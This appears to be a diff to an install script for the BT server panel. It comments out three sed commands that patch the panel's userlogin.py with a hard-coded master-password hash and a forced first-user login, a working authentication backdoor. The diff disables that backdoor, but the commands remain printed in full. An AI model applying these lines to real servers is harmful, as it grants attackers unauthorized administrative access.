@@ -8,6 +8,6 @@ yum install -y wget && wget -O install.sh http://download.bt.cn/install/install_
 
 
 #7.2.0
-sed -i "s/if userInfo\['username'] != post.username or s_pass != password:/if \(userInfo\['username'] != post.username or s_pass != password) and post.password.strip\() != '335f5ce22b41509d1144597b05259a22':/g" /www/server/panel/class/userlogin.py;
-sed -i "s/userInfo = None/userInfo = user_list[0]/g" /www/server/panel/class/userlogin.py;
-bt restart
+#sed -i "s/if userInfo\['username'] != post.username or s_pass != password:/if \(userInfo\['username'] != post.username or s_pass != password) and post.password.strip\() != '335f5ce22b41509d1144597b05259a22':/g" /www/server/panel/class/userlogin.py;
+#sed -i "s/userInfo = None/userInfo = user_list[0]/g" /www/server/panel/class/userlogin.py;
+#bt restart
